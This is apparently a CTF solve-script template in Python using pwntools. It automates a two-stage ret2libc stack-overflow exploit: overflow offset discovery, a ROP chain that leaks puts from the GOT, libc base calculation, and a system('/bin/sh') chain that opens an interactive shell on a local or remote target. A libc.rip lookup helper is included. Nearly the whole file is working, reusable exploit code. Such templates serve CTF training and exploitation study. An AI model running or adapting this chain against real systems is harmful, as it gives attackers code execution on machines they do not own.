#!/usr/bin/env python3
"""
ret2libc pwntools solve script template (GOT leak → system('/bin/sh')).

PURPOSE
-------
Exploit a binary with NX enabled and no PIE (or a known PIE base) by:

  Stage 1 — Leak the runtime address of ``puts`` via a ROP chain that calls
             ``puts(puts@got)``, then return to ``main`` for re-entry.
  Stage 2 — Calculate libc base, build ``system('/bin/sh')`` payload, pwn.

USAGE
-----
1.  Set CONFIG values below.
2.  Run locally:  python3 ret2libc.py
3.  Set REMOTE = True for remote exploitation.

LIBC IDENTIFICATION
-------------------
After obtaining the puts leak, identify the libc version:

*  https://libc.rip           (web UI and API)
*  https://libc.blukat.me
*  local libc-database:       ``./find puts <last-3-hex-digits>``

Once you know the libc, set LIBC_PATH below.

REQUIREMENTS
------------
    pip install pwntools

AUTHOR: Sentinel CTF Framework
"""

# =============================================================================
# CONFIG
# =============================================================================

EXE_PATH    = "./vuln"
LIBC_PATH   = "./libc.so.6"     # Local copy of the target's libc
REMOTE_HOST = "chall.example.com"
REMOTE_PORT = 1337
REMOTE      = False

# ---- Gadget / symbol addresses (no-PIE binary) ----
# Use: ROPgadget --binary ./vuln | grep 'pop rdi'
POP_RDI     = 0x0000000000401273  # PLACEHOLDER
# Use: ROPgadget --binary ./vuln | grep ': ret'
RET_GADGET  = 0x000000000040101a  # PLACEHOLDER

# =============================================================================

from pwn import (  # type: ignore  # noqa: E402
    ELF,
    ROP,
    context,
    cyclic,
    cyclic_find,
    flat,
    log,
    p64,
    process,
    remote,
    u64,
)

# ---------------------------------------------------------------------------
# Binary / libc setup
# ---------------------------------------------------------------------------

elf  = ELF(EXE_PATH, checksec=True)
libc = ELF(LIBC_PATH)
context.binary   = elf
context.log_level = "info"

# ---------------------------------------------------------------------------
# Connection helper
# ---------------------------------------------------------------------------

def connect():
    """Return a pwntools tube for the target (local or remote)."""
    if REMOTE:
        log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}")
        return remote(REMOTE_HOST, REMOTE_PORT)
    log.info(f"Spawning {EXE_PATH}")
    return process(EXE_PATH)


# ---------------------------------------------------------------------------
# Offset discovery (same strategy as ret2win template)
# ---------------------------------------------------------------------------

def find_offset() -> int:
    """
    Return the number of padding bytes before the saved return address.

    Hard-code ``KNOWN_OFFSET`` once discovered to skip this step on
    subsequent runs.
    """
    KNOWN_OFFSET: int | None = None  # e.g. 72

    if KNOWN_OFFSET is not None:
        log.success(f"Using hard-coded offset: {KNOWN_OFFSET}")
        return KNOWN_OFFSET

    # Automated core-dump strategy:
    pattern = cyclic(200)
    io      = connect()
    io.sendlineafter(b">", pattern)
    io.wait()
    core = io.corefile
    if core:
        offset = cyclic_find(core.rip)
        log.success(f"Offset (core): {offset}")
        return offset

    # Manual fallback — paste the RIP value from gdb here:
    crash_rip = 0x6161616161616166  # PLACEHOLDER
    return cyclic_find(crash_rip)


# ---------------------------------------------------------------------------
# Stage 1: leak puts@libc
# ---------------------------------------------------------------------------

def stage1_leak(offset: int) -> tuple[int, "tube"]:  # type: ignore[name-defined]
    """
    Send the GOT-leak ROP chain and return the leaked puts address.

    Chain layout::

        [padding] [pop rdi; ret] [puts@got] [puts@plt] [main]

    Parameters
    ----------
    offset:
        Padding length.

    Returns
    -------
    tuple[int, tube]
        (runtime address of puts, open I/O tube for stage 2)
    """
    rop = ROP(elf)

    # Build leak chain manually using known gadget or auto-ROP:
    try:
        # Attempt automatic ROP construction with pwntools
        rop.puts(elf.got["puts"])
        rop.main()
        chain = rop.chain()
    except Exception:
        # Manual fallback
        chain = flat(
            POP_RDI,
            elf.got["puts"],
            elf.plt["puts"],
            elf.sym["main"],
        )

    payload = b"A" * offset + chain
    log.info(f"Stage 1 payload ({len(payload)} bytes): {payload.hex()}")

    io = connect()
    io.recvuntil(b">")       # edit to match binary prompt
    io.sendline(payload)

    # Read the 6-byte little-endian leak from puts output
    io.recvuntil(b"\n")      # skip echoed input / junk (adjust as needed)
    raw  = io.recv(6)
    leak = u64(raw.ljust(8, b"\x00"))
    log.success(f"Leaked puts@libc = {leak:#x}")

    return leak, io


# ---------------------------------------------------------------------------
# Stage 2: system('/bin/sh')
# ---------------------------------------------------------------------------

def stage2_shell(offset: int, puts_leak: int, io) -> bytes:
    """
    Calculate libc base from the leak and send the system('/bin/sh') chain.

    Parameters
    ----------
    offset:
        Padding length (same as stage 1).
    puts_leak:
        Runtime address of ``puts`` in libc.
    io:
        Open pwntools tube (binary has returned to ``main``).

    Returns
    -------
    bytes
        Flag string retrieved from the shell.
    """
    # --------------- Calculate libc base ---------------
    libc.address = puts_leak - libc.sym["puts"]
    log.success(f"libc base      = {libc.address:#x}")
    log.success(f"system         = {libc.sym['system']:#x}")
    log.success(f"/bin/sh        = {next(libc.search(b'/bin/sh')):#x}")

    # --------------- Build stage 2 payload ---------------
    rop2 = ROP(libc)
    try:
        rop2.system(next(libc.search(b"/bin/sh")))
        chain2 = rop2.chain()
    except Exception:
        chain2 = flat(
            RET_GADGET,                             # alignment
            POP_RDI,
            next(libc.search(b"/bin/sh")),
            libc.sym["system"],
        )

    payload2 = b"A" * offset + chain2
    log.info(f"Stage 2 payload ({len(payload2)} bytes)")

    io.recvuntil(b">")    # binary is back at main's prompt
    io.sendline(payload2)

    log.success("Dropping into interactive shell — type your commands!")
    io.interactive()

    # If you prefer to capture the flag automatically instead:
    # io.sendline(b"cat flag.txt")
    # flag = io.recvline()
    # io.close()
    # return flag
    return b""


# ---------------------------------------------------------------------------
# libc-database auto-lookup (optional helper)
# ---------------------------------------------------------------------------

def lookup_libc_online(puts_leak: int) -> None:
    """
    Query libc.rip to identify the remote libc version from the puts leak.

    Uses the last 3 hex nibbles (12 bits) of the address, which remain
    constant regardless of ASLR.

    This function is informational only — update LIBC_PATH manually after
    the query.

    Parameters
    ----------
    puts_leak:
        Runtime address of ``puts`` (from stage 1).
    """
    try:
        import requests  # type: ignore
    except ImportError:
        log.warning("requests not installed — skipping libc lookup.")
        return

    partial = f"{puts_leak & 0xfff:03x}"
    url     = f"https://libc.rip/api/find?symbol=puts&offset=0x{partial}"
    log.info(f"Querying libc.rip: {url}")
    try:
        resp = requests.get(url, timeout=10)
        data = resp.json()
        if data:
            log.success(f"Candidate libcs found: {len(data)}")
            for entry in data[:5]:          # show up to 5 candidates
                log.info(
                    f"  {entry.get('id','?')} — "
                    f"puts offset: {entry.get('symbols',{}).get('puts','?')}"
                )
        else:
            log.warning("No matching libc found on libc.rip.")
    except Exception as exc:
        log.warning(f"libc.rip query failed: {exc}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    """Orchestrate the two-stage ret2libc exploit."""
    offset = find_offset()
    log.info(f"Offset: {offset}")

    puts_leak, io = stage1_leak(offset)

    # Optional: identify libc version
    # lookup_libc_online(puts_leak)

    stage2_shell(offset, puts_leak, io)


if __name__ == "__main__":
    main()
